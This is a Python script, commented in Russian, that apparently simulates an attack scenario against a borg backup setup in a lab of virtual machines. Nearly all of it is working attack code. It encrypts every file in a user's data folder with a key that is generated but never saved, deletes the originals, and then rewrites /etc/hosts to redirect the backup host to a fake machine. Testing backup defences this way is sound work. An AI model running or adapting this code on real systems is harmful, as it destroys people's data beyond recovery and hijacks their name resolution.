#!/usr/bin/env python3
"""
Сценарий D — MITM атака через подмену /etc/hosts.
Злоумышленник подменяет имя vm-backup на адрес VM-FAKE.
Cron-скрипт пытается создать архив — borg обнаруживает
несоответствие ID репозитория и отказывает в создании архива.
"""
import os, logging
from pathlib import Path
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('/tmp/sim_d.log'),
              logging.StreamHandler()])
log = logging.getLogger(__name__)
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)

def encrypt_file(f):
    try:
        data = open(f,'rb').read()
        open(str(f)+'.locked','wb').write(CIPHER.encrypt(data))
        os.remove(f); return True
    except: return False

# Шаг 1: шифруем файлы жертвы
# Без бэкапа восстановление будет невозможным
target = Path('/home/testuser/important_data')
enc = sum(1 for f in target.rglob('*')
          if f.is_file() and not str(f).endswith('.locked')
          and encrypt_file(f))
log.info(f'Victim files encrypted: {enc}')

# Шаг 2: подменяем vm-backup в /etc/hosts на адрес VM-FAKE
# После подмены cron-скрипт будет подключаться к VM-FAKE
hosts = Path('/etc/hosts')
try:
    content = hosts.read_text()
    if '192.168.56.20  vm-backup' in content:
        content = content.replace(
            '192.168.56.20  vm-backup',
            '192.168.56.99  vm-backup'
        )
        hosts.write_text(content)
        log.warning('HOSTS MODIFIED: vm-backup -> 192.168.56.99 (VM-FAKE)')
        log.warning('Next cron backup will attempt to connect to VM-FAKE')
    else:
        log.error('Entry vm-backup not found in /etc/hosts')
except Exception as e:
    log.error(f'Cannot modify /etc/hosts: {e}')
